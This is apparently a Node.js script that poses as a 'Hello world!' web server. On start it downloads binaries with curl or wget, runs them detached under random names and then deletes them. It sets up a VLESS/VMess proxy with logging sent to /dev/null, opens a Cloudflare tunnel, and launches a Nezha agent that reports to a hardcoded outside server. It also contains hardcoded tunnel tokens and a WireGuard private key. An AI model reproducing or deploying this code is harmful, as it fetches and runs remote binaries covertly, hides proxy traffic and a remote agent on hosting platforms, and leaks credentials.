const http = require('http');
const fs = require('fs').promises;
const { exec, spawn } = require('child_process');
const path = require('path');

const PORT = process.env.PORT || 3000;
const FILE_PATH = process.env.FILE_PATH || path.resolve('./.npm'); // Use absolute path

// 设置环境变量
const env = {
    UUID: process.env.UUID || 'faacf142-dee8-48c2-8558-641123eb939c',
    NEZHA_SERVER: process.env.NEZHA_SERVER || 'nezha.mingfei1981.eu.org',
    NEZHA_PORT: process.env.NEZHA_PORT || '443',
    NEZHA_KEY: process.env.NEZHA_KEY || 'l5GINS8lct8Egroitn',
    ARGO_DOMAIN: process.env.ARGO_DOMAIN || 'appwrite.ncaa.nyc.mn',
    ARGO_AUTH: process.env.ARGO_AUTH || 'eyJhIjoiOTk3ZjY4OGUzZjBmNjBhZGUwMWUxNGRmZTliOTdkMzEiLCJ0IjoiZDQzMTc4YTEtZGRmYy00YTkwLWI0YzAtNzNkODUwYzY3NDdmIiwicyI6IlptWm1NMlppT0RZdE1tRTFOeTAwTlRVd0xUbGhaV0V0WmpsaFl6VTFOV0k0TVRCbSJ9',
    CFIP: process.env.CFIP || 'ip.sb',
    CFPORT: process.env.CFPORT || '443',
    NAME: process.env.NAME || 'free',
    ARGO_PORT: process.env.ARGO_PORT || '8001'
};

async function initialize() {
    try {
        await fs.mkdir(FILE_PATH, { recursive: true });
        await Promise.all([
            fs.unlink(path.join(FILE_PATH, 'boot.log')).catch(() => {}),
            fs.unlink(path.join(FILE_PATH, 'log.txt')).catch(() => {}),
            fs.unlink(path.join(FILE_PATH, 'config.json')).catch(() => {}),
            fs.unlink(path.join(FILE_PATH, 'tunnel.json')).catch(() => {}),
            fs.unlink(path.join(FILE_PATH, 'tunnel.yml')).catch(() => {})
        ]);

        await configureArgo();
        await generateConfig();
        await downloadAndRun();
        await generateLinks();
    } catch (error) {
        console.error('Initialization failed:', error);
    }
}

async function configureArgo() {
    if (!env.ARGO_AUTH || !env.ARGO_DOMAIN) return;

    if (env.ARGO_AUTH.includes('TunnelSecret')) {
        await fs.writeFile(path.join(FILE_PATH, 'tunnel.json'), env.ARGO_AUTH);
        const tunnelYml = `
tunnel: ${env.ARGO_AUTH.split('"')[11]}
credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
protocol: http2

ingress:
  - hostname: ${env.ARGO_DOMAIN}
    service: http://localhost:${env.ARGO_PORT}
    originRequest:
      noTLSVerify: true
  - service: http_status:404
`;
        await fs.writeFile(path.join(FILE_PATH, 'tunnel.yml'), tunnelYml);
    }
}

async function generateConfig() {
    const config = {
        log: { access: "/dev/null", error: "/dev/null", loglevel: "none" },
        inbounds: [
            { port: env.ARGO_PORT, protocol: "vless", settings: { clients: [{ id: env.UUID, flow: "xtls-rprx-vision" }], decryption: "none", fallbacks: [{ dest: 3001 }, { path: "/vless", dest: 3002 }, { path: "/vmess", dest: 3003 }, { path: "", dest: 3004 }] }, streamSettings: { network: "tcp" } },
            { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: env.UUID }], decryption: "none" }, streamSettings: { network: "ws", security: "none" } },
            { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: env.UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
            { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: env.UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
            { port: 3004, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: env.UUID, alterId: 0, security: "auto" }] }, streamSettings: { network: "splithttp", security: "none", httpSettings: { host: "", path: "" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } }
        ],
        dns: { servers: ["https+local://8.8.8.8/dns-query"] },
        outbounds: [
            { protocol: "freedom" },
            { tag: "WARP", protocol: "wireguard", settings: { secretKey: "YFYOAdbw1bKTHlNNi+aEjBM3BO7unuFC5rOkMRAz9XY=", address: ["172.16.0.2/32", "2606:4700:110:8a36:df92:102a:9602:fa18/128"], peers: [{ publicKey: "bmXOC+F1FxEMF9dyiK2H5/1SUtzH0JuVo51h2wPfgyo=", allowedIPs: ["0.0.0.0/0", "::/0"], endpoint: "162.159.193.10:2408" }], reserved: [78, 135, 76], mtu: 1280 } }
        ],
        routing: { domainStrategy: "AsIs", rules: [{ type: "field", domain: ["domain:chat.openai.com", "domain:chatgpt.com", "domain:openai.com", "domain:ai.com"], outboundTag: "WARP" }] }
    };
    await fs.writeFile(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

async function downloadAndRun() {
    const arch = process.arch;
    const files = {
        'arm': { bot: 'https://github.com/eooce/test/releases/download/arm64/bot13', web: 'https://github.com/eooce/test/releases/download/ARM/web', npm: 'https://github.com/eooce/test/releases/download/ARM/swith' },
        'arm64': { bot: 'https://github.com/eooce/test/releases/download/arm64/bot13', web: 'https://github.com/eooce/test/releases/download/ARM/web', npm: 'https://github.com/eooce/test/releases/download/ARM/swith' },
        'x64': { bot: 'https://github.com/eooce/test/releases/download/amd64/bot13', web: 'https://github.com/eooce/test/releases/download/amd64/seen', npm: 'https://github.com/eooce/test/releases/download/bulid/swith' }
    };

    if (!files[arch]) throw new Error(`Unsupported architecture: ${arch}`);

    const fileMap = {};
    for (const [name, url] of Object.entries(files[arch])) {
        const randomName = Math.random().toString(36).substring(2, 8);
        const filePath = path.join(FILE_PATH, randomName);
        await downloadFile(url, filePath);
        await fs.chmod(filePath, '755');
        fileMap[name] = filePath;
    }

    if (env.NEZHA_SERVER && env.NEZHA_PORT && env.NEZHA_KEY) {
        const tlsPorts = ["443", "8443", "2096", "2087", "2083", "2053"];
        const nezhaTLS = tlsPorts.includes(env.NEZHA_PORT) ? '--tls' : '';
        spawn(fileMap.npm, ['-s', `${env.NEZHA_SERVER}:${env.NEZHA_PORT}`, '-p', env.NEZHA_KEY, nezhaTLS], { detached: true, stdio: 'ignore' }).unref();
    }

    spawn(fileMap.web, ['-c', path.join(FILE_PATH, 'config.json')], { detached: true, stdio: 'ignore' }).unref();

    let args;
    if (/^[A-Z0-9a-z=]{120,250}$/.test(env.ARGO_AUTH)) {
        args = ['tunnel', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2', 'run', '--token', env.ARGO_AUTH];
    } else if (env.ARGO_AUTH.includes('TunnelSecret')) {
        args = ['tunnel', '--region', 'us', '--edge-ip-version', 'auto', '--config', path.join(FILE_PATH, 'tunnel.yml'), 'run'];
    } else {
        args = ['tunnel', '--region', 'us', '--edge-ip-version', 'auto', '--no-autoupdate', '--protocol', 'http2', '--logfile', path.join(FILE_PATH, 'boot.log'), '--loglevel', 'info', '--url', `http://localhost:${env.ARGO_PORT}`];
    }
    spawn(fileMap.bot, args, { detached: true, stdio: 'ignore' }).unref();

    await Promise.all(Object.values(fileMap).map(file => fs.unlink(file).catch(() => {})));
}

async function downloadFile(url, dest) {
    return new Promise((resolve, reject) => {
        exec(`curl -L -sS -o ${dest} ${url} || wget -q -O ${dest} ${url}`, (error) => {
            if (error) reject(error);
            else resolve();
        });
    });
}

async function generateLinks() {
    const argodomain = env.ARGO_AUTH ? env.ARGO_DOMAIN : await getArgoDomain();

    const isp = await new Promise(resolve => {
        exec('curl -s https://speed.cloudflare.com/meta', (err, stdout) => {
            if (err || !stdout) {
                console.error('Failed to fetch ISP metadata:', err);
                resolve('unknown');
                return;
            }
            try {
                const data = JSON.parse(stdout);
                resolve(`${data.city}-${data.country}`.replace(' ', '_'));
            } catch (parseError) {
                console.error('Failed to parse ISP metadata:', parseError);
                resolve('unknown');
            }
        });
    });

    const links = [
        `vless://${env.UUID}@${env.CFIP}:${env.CFPORT}?encryption=none&security=tls&sni=${argodomain}&type=ws&host=${argodomain}&path=%2Fvless%3Fed%3D2048#${env.NAME}-${isp}`,
        `vmess://${Buffer.from(JSON.stringify({ v: "2", ps: `${env.NAME}-${isp}`, add: env.CFIP, port: env.CFPORT, id: env.UUID, aid: "0", scy: "none", net: "ws", type: "none", host: argodomain, path: "/vmess?ed=2048", tls: "tls", sni: argodomain, alpn: "" })).toString('base64')}`,
        `vmess://${Buffer.from(JSON.stringify({ v: "2", ps: `${env.NAME}-${isp}`, add: env.CFIP, port: env.CFPORT, id: env.UUID, aid: "0", scy: "none", net: "splithttp", type: "none", host: argodomain, path: "", tls: "tls", sni: argodomain, alpn: "" })).toString('base64')}`
    ];

    await fs.writeFile(path.join(FILE_PATH, 'list.txt'), links.join('\n'));
}

async function getArgoDomain() {
    for (let retry = 0; retry < 6; retry++) {
        try {
            const content = await fs.readFile(path.join(FILE_PATH, 'boot.log'), 'utf8');
            const match = content.match(/https:\/\/[a-z0-9+\.-]+\.trycloudflare\.com/);
            if (match) return match[0].replace('https://', '');
        } catch (e) {}
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    return '';
}

const server = http.createServer(async (req, res) => {
    if (req.url === '/') {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('Hello world!');
    } else if (req.url === '/sub') {
        try {
            const data = await fs.readFile(path.join(FILE_PATH, 'list.txt'), 'utf8');
            res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
            res.end(data);
        } catch (error) {
            console.error(error);
            res.writeHead(500, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({ error: 'Error reading list.txt' }));
        }
    }
});

server.listen(PORT, initialize);
